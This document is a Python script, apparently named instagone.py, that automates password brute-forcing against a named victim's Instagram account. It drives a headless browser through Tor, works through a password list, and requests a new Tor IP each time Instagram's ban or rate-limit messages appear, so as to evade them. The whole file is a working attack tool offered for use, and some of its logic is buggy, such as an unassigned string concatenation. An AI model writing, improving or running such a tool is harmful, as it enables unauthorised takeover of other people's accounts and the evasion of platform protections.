from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup
from stem import Signal
from stem.control import Controller
from optparse import OptionParser
import random
import time
import sys
import threading

banner = """
 _____              _                                     
|_   _|            | |                                    
  | |   _ __   ___ | |_   __ _   __ _   ___   _ __    ___ 
  | |  | '_ \ / __|| __| / _` | / _` | / _ \ | '_ \  / _ |
 _| |_ | | | |\__ \| |_ | (_| || (_| || (_) || | | ||  __/
 \___/ |_| |_||___/ \__| \__,_| \__, | \___/ |_| |_| \___|
                                 __/ |                    
                                |___/                  
\n"""

############### USAGE
def usage():
    print("""\n

    Usage: instagone.py [-u] username [-l] passwordlist

    REQUIRED:
        -u or --username: 
          The username of the victim
        #######################################
        -l or --list: 
          The password list to be used 

    HELP:
        -h or --help:
          Displays this menu
        
    """)
    sys.exit()

############### Variables
LOGIN_URL = "https://www.instagram.com/accounts/login/"
PROXY = "socks5://127.0.0.1:9050"

#bad titles
badtitles = [
  "Login • Instagram",  
  "Page Not Found &bull; Instagram",
  "Page Not Found • Instagram",
]
#messages that sign that the IP is banned
bannedIPStrs = [
  "Please wait a few minutes before you try again",
  "We couldn't connect",
  "There was a problem logging you into Instagram",
  "Page not found"
]
#messages that sign that we are in
LoggedInMsgs = [
  'class="no-js logged-in',
  "Suspicious Login Attempt"
]
#message(s) that sign that we are OUT
LoggedOutMsgs = [
  "incorrect"
]

# Class for all the methods we need
class Engine():
  def __init__(self):
    ##################### Webdriver setup ########################
    options = webdriver.ChromeOptions()
    options.add_argument(f"--proxy-server={PROXY}")
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.add_argument("headless")
    self.driver = webdriver.Chrome(options=options)
    ############# Setting up the options for the terminal ##################
    parser = OptionParser()
    parser.set_conflict_handler("resolve")
    parser.add_option("-u", "--username", dest="uname")
    parser.add_option("-h", "--help", dest="help", action="store_true")
    parser.add_option("-l", "--list", dest="passlist")
    (options, args) = parser.parse_args()
    # If the username is set, the help menu cannot be shown (if called at the same time)
    if options.uname:
      options.help = None
    # Run the help menu
    if (options.uname is None) or (options.passlist is None) or (options.help):
      usage()
    ############# variables to be used throughout the code ##################
    self.fetchTime = 4
    self.uname = options.uname
    self.passlist = options.passlist
    self.line = 0
    self.hopCount = 0
    self.lineMultiplier = 30
    self.passwordArray = []
    self.ban = False
    ############# putting all the passwords into an array #########################
    passwordFile = open(self.passlist, "r")
    for line in passwordFile:
      self.passwordArray.append(line.strip())
    
  ################################### METHODS ############################################

  # New TOR IP + new browser
  def renew_tor_ip(self):
    with Controller.from_port(port=9051) as controller:
      time.sleep(self.fetchTime - 2)
      controller.authenticate()
      controller.signal(Signal.NEWNYM)
      print("[!] New IP is assigned")
      print("-"*(self.lineMultiplier - 10))
      self.driver.quit()
      options = webdriver.ChromeOptions()
      options.add_argument(f"--proxy-server={PROXY}")
      options.add_experimental_option('excludeSwitches', ['enable-logging'])
      options.add_argument("headless")
      self.driver = webdriver.Chrome(options=options)
      print("[!] New browser is opened")
      print("-"*(self.lineMultiplier - 10))
      print("-"*self.lineMultiplier + "\n")
      return self.driver
  
  # Deal with the file and new password + increment counters
  def passHandling(self):
    self.hopCount += 1
    self.p = self.passwordArray[self.line]
    print("-"*self.lineMultiplier)
    print(f"Username: {self.uname}")
    print(f"Password: {self.p}")
    print(f"Number of tries: {self.hopCount}")
    print("-"*self.lineMultiplier)
    self.line += 1
    return self.p
    
  # logging into insta 
  def loginProcedure(self):
    self.driver.get(LOGIN_URL)
    while self.driver.current_url != LOGIN_URL:
      self.driver.get(LOGIN_URL)
    time.sleep(self.fetchTime)
    #banned ip
    for string in bannedIPStrs:
      while string in self.driver.page_source:
        if self.ban is False:
          self.line -= 1
        print("[!] IP banned by Instagram")
        print("-"*(self.lineMultiplier - 10))
        self.renew_tor_ip()
        self.driver.get(LOGIN_URL)
        self.ban = True
        return self.driver.page_source
    self.ban = True
    username_field = self.driver.find_element_by_name("username")
    password_field = self.driver.find_element_by_name("password")
    username_field.send_keys(self.uname)
    # If the password is less than 6 chars, add and extra "111111" to the end
    # as the HTMl button would not be clickable
    if len(self.p) < 6:
      self.p + "111111"
      password_field.send_keys(self.p)
    else:
      password_field.send_keys(self.p)
    submit = self.driver.find_element_by_class_name("sqdOP.L3NKy.y3zKF")
    submit.click()
    time.sleep(self.fetchTime + 1)
    return self.driver.page_source

  # Login detection
  def getError(self):
    soup = BeautifulSoup(self.driver.page_source, "html.parser")
    #banned ip
    for string in bannedIPStrs:
      if string in self.driver.page_source:
        self.line -= 1
        print("[!] IP banned by Instagram")
        print("-"*(self.lineMultiplier - 10))
        self.renew_tor_ip()
        return None
    #other login possibilities
    for msgs in LoggedInMsgs:
      if msgs in soup:
        print("\n[+] Password found")
        print(f"Password: {self.p}")
        print(f"Username: {self.uname}\n")
        self.driver.quit()
        sys.exit()
    # title
    if soup.title.string in badtitles:
      print("[-] No match")    
      print("-"*self.lineMultiplier + "\n")
     # title
    elif "incorrect" in badtitles:
      print("[-] No match")
      print("-"*self.lineMultiplier + "\n")
    # good title
    else:
      print("\n[+] Password found")
      print(f"Password: {self.p}")
      print(f"Username: {self.uname}\n")
      self.driver.quit()
      sys.exit()

print(banner)
# calling the class outside of the loop, so it will not rewrite all the vars
BRUTER = Engine()
#Looping
while True:
  BRUTER.passHandling()
  BRUTER.loginProcedure()
  BRUTER.getError()

